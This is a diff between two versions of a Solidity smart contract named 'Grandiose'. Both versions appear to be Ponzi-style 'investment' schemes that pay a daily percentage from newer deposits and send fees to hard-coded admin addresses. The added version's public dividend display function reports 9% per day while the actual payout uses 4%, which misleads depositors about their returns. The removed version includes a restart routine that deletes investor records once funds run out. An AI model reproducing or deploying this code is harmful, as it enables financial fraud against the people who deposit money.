@@ -1,228 +1,96 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract Grandiose at 0x0475db744818f6f1a7224886a1b4927670790924
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract Grandiose at 0xf1ab95642a89b7eaf3fa87c36b22ff41fd8c7594
 */
-pragma solidity ^0.4.24;
-/*
-                                                                              
-    //   ) )                                                                  
-   //         __      ___       __      ___   / ( )  ___      ___      ___    
-  //  ____  //  ) ) //   ) ) //   ) ) //   ) / / / //   ) ) ((   ) ) //___) ) 
- //    / / //      //   / / //   / / //   / / / / //   / /   \ \    //        
-((____/ / //      ((___( ( //   / / ((___/ / / / ((___/ / //   ) ) ((____   
+pragma solidity ^0.4.25;
 
-http://Grandiose.tech
+library SafeMath {
+  function mul(uint256 _a, uint256 _b) internal pure returns (uint256 c) {
+    if (_a == 0) {
+      return 0;
+    }
+    c = _a * _b;
+    assert(c / _a == _b);
+    return c;
+  }
 
-*/
+  function div(uint256 _a, uint256 _b) internal pure returns (uint256) {
+    return _a / _b;
+  }
+
+  function sub(uint256 _a, uint256 _b) internal pure returns (uint256) {
+    assert(_b <= _a);
+    return _a - _b;
+  }
+
+  function add(uint256 _a, uint256 _b) internal pure returns (uint256 c) {
+    c = _a + _b;
+    assert(c >= _a);
+    return c;
+  }
+}
 
 contract Grandiose {
-    address public owner;
-    address public adminAddr;
-    uint constant public MASS_TRANSACTION_LIMIT = 150;
-    uint constant public MINIMUM_INVEST = 10000000000000000 wei;
-    uint constant public INTEREST = 4;
-    uint public depositAmount;
-    uint public round;
-    uint public lastPaymentDate;
-    GorgonaKiller public gorgonaKiller;
-    address[] public addresses;
-    mapping(address => Investor) public investors;
-    bool public pause;
+	using SafeMath for uint256;
 
-    struct Investor
-    {
-        uint id;
-        uint deposit;
-        uint deposits;
-        uint date;
-        address referrer;
+	address public constant admAddress = 0xaf9c025ce6322a23ac00301c714f4f42895c9818;
+	address public constant advAddress = 0x44503314c43422764582502e59a6b2905f999d04;
+
+	mapping (address => uint256) deposited;
+	mapping (address => uint256) withdrew;
+	mapping (address => uint256) refearned;
+	mapping (address => uint256) blocklock;
+
+	uint256 public totalDepositedWei = 0;
+	uint256 public totalWithdrewWei = 0;
+
+	function() payable external {
+		uint256 admRefPerc = msg.value.mul(5).div(100);
+		uint256 advPerc = msg.value.mul(10).div(100);
+
+		advAddress.transfer(advPerc);
+		admAddress.transfer(admRefPerc);
+
+		if (deposited[msg.sender] != 0) {
+			address investor = msg.sender;
+			uint256 depositsPercents = deposited[msg.sender].mul(4).div(100).mul(block.number-blocklock[msg.sender]).div(5900);
+			investor.transfer(depositsPercents);
+
+			withdrew[msg.sender] += depositsPercents;
+			totalWithdrewWei = totalWithdrewWei.add(depositsPercents);
+		}
+
+		address referrer = bytesToAddress(msg.data);
+		if (referrer > 0x0 && referrer != msg.sender) {
+			referrer.transfer(admRefPerc);
+
+			refearned[referrer] += admRefPerc;
+		}
+
+		blocklock[msg.sender] = block.number;
+		deposited[msg.sender] += msg.value;
+
+		totalDepositedWei = totalDepositedWei.add(msg.value);
+	}
+
+	function userDepositedWei(address _address) public view returns (uint256) {
+		return deposited[_address];
     }
 
-    struct GorgonaKiller
-    {
-        address addr;
-        uint deposit;
+	function userWithdrewWei(address _address) public view returns (uint256) {
+		return withdrew[_address];
     }
 
-    event Invest(address addr, uint amount, address referrer);
-    event Payout(address addr, uint amount, string eventType, address from);
-    event NextRoundStarted(uint round, uint date, uint deposit);
-    event GorgonaKillerChanged(address addr, uint deposit);
-
-    modifier onlyOwner {if (msg.sender == owner) _;}
-
-    constructor() public {
-        owner = msg.sender;
-        adminAddr = msg.sender;
-        addresses.length = 1;
-        round = 1;
+	function userDividendsWei(address _address) public view returns (uint256) {
+		return deposited[_address].mul(9).div(100).mul(block.number-blocklock[_address]).div(5900);
     }
 
-    function transferOwnership(address addr) onlyOwner public {
-        owner = addr;
+	function userReferralsWei(address _address) public view returns (uint256) {
+		return refearned[_address];
     }
 
-    function addInvestors(address[] _addr, uint[] _deposit, uint[] _date, address[] _referrer) onlyOwner public {
-        // add initiated investors
-        for (uint i = 0; i < _addr.length; i++) {
-            uint id = addresses.length;
-            if (investors[_addr[i]].deposit == 0) {
-                addresses.push(_addr[i]);
-                depositAmount += _deposit[i];
-            }
-
-            investors[_addr[i]] = Investor(id, _deposit[i], 1, _date[i], _referrer[i]);
-            emit Invest(_addr[i], _deposit  [i], _referrer[i]);
-
-            if (investors[_addr[i]].deposit > gorgonaKiller.deposit) {
-                gorgonaKiller = GorgonaKiller(_addr[i], investors[_addr[i]].deposit);
-            }
-        }
-        lastPaymentDate = now;
-    }
-
-    function() payable public {
-        if (owner == msg.sender) {
-            return;
-        }
-
-        if (0 == msg.value) {
-            payoutSelf();
-            return;
-        }
-
-        require(false == pause, "Gorgona is restarting. Please wait.");
-        require(msg.value >= MINIMUM_INVEST, "Too small amount, minimum 0.01 ether");
-        Investor storage user = investors[msg.sender];
-
-        if (user.id == 0) {
-            // ensure that payment not from hacker contract
-            msg.sender.transfer(0 wei);
-            addresses.push(msg.sender);
-            user.id = addresses.length;
-            user.date = now;
-
-            // referrer
-            address referrer = bytesToAddress(msg.data);
-            if (investors[referrer].deposit > 0 && referrer != msg.sender) {
-                user.referrer = referrer;
-            }
-        } else {
-            payoutSelf();
-        }
-
-        // save investor
-        user.deposit += msg.value;
-        user.deposits += 1;
-
-        emit Invest(msg.sender, msg.value, user.referrer);
-
-        depositAmount += msg.value;
-        lastPaymentDate = now;
-
-        adminAddr.transfer(msg.value / 5); // project fee
-        uint bonusAmount = (msg.value / 100) * INTEREST; // referrer commission for all deposits
-
-        if (user.referrer > 0x0) {
-            if (user.referrer.send(bonusAmount)) {
-                emit Payout(user.referrer, bonusAmount, "referral", msg.sender);
-            }
-
-            if (user.deposits == 1) { // cashback only for the first deposit
-                if (msg.sender.send(bonusAmount)) {
-                    emit Payout(msg.sender, bonusAmount, "cash-back", 0);
-                }
-            }
-        } else if (gorgonaKiller.addr > 0x0) {
-            if (gorgonaKiller.addr.send(bonusAmount)) {
-                emit Payout(gorgonaKiller.addr, bonusAmount, "killer", msg.sender);
-            }
-        }
-
-        if (user.deposit > gorgonaKiller.deposit) {
-            gorgonaKiller = GorgonaKiller(msg.sender, user.deposit);
-            emit GorgonaKillerChanged(msg.sender, user.deposit);
-        }
-    }
-
-    function payout(uint offset) public
-    {
-        if (pause == true) {
-            doRestart();
-            return;
-        }
-
-        uint txs;
-        uint amount;
-
-        for (uint idx = addresses.length - offset - 1; idx >= 1 && txs < MASS_TRANSACTION_LIMIT; idx--) {
-            address addr = addresses[idx];
-            if (investors[addr].date + 20 hours > now) {
-                continue;
-            }
-
-            amount = getInvestorDividendsAmount(addr);
-            investors[addr].date = now;
-
-            if (address(this).balance < amount) {
-                pause = true;
-                return;
-            }
-
-            if (addr.send(amount)) {
-                emit Payout(addr, amount, "bulk-payout", 0);
-            }
-
-            txs++;
-        }
-    }
-
-    function payoutSelf() private {
-        require(investors[msg.sender].id > 0, "Investor not found.");
-        uint amount = getInvestorDividendsAmount(msg.sender);
-
-        investors[msg.sender].date = now;
-        if (address(this).balance < amount) {
-            pause = true;
-            return;
-        }
-
-        msg.sender.transfer(amount);
-        emit Payout(msg.sender, amount, "self-payout", 0);
-    }
-
-    function doRestart() private {
-        uint txs;
-        address addr;
-
-        for (uint i = addresses.length - 1; i > 0; i--) {
-            addr = addresses[i];
-            addresses.length -= 1;
-            delete investors[addr];
-            if (txs++ == MASS_TRANSACTION_LIMIT) {
-                return;
-            }
-        }
-
-        emit NextRoundStarted(round, now, depositAmount);
-        pause = false;
-        round += 1;
-        depositAmount = 0;
-        lastPaymentDate = now;
-
-        delete gorgonaKiller;
-    }
-
-    function getInvestorCount() public view returns (uint) {
-        return addresses.length - 1;
-    }
-
-    function getInvestorDividendsAmount(address addr) public view returns (uint) {
-        return investors[addr].deposit / 100 * INTEREST * (now - investors[addr].date) / 1 days;
-    }
-
-    function bytesToAddress(bytes bys) private pure returns (address addr) {
-        assembly {
-            addr := mload(add(bys, 20))
-        }
-    }
+	function bytesToAddress(bytes bys) private pure returns (address addr) {
+		assembly {
+			addr := mload(add(bys, 20))
+		}
+	}
 }
